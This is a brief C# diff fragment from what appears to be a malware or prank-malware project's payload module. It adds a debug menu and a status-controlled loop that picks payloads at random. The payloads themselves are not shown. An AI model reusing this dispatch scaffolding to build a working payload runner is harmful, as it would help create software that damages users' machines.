@@ -283,8 +283,25 @@ namespace Abantes.Payloads
         static Random _random = new Random();
         public static void MainPayloadThread()
         {
-
-            while (true)
+            if (MainThread.Mode == 1)
+            {
+                if (MessageBox.Show("OPEN PAYLOAD DEBUG MENU?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                {
+                    //Form Debug = new PayloadDebugger();
+                    //Debug.Show();
+                    Application.EnableVisualStyles();
+                    Application.Run(new PayloadDebugger());
+                }
+                else
+                {
+                    PayloadDebugger.Status = 0;
+                }
+            }
+            else
+            {
+                PayloadDebugger.Status = 0;
+            }
+            while (PayloadDebugger.Status == 0)
             {
                 switch (_random.Next(13))
                 {
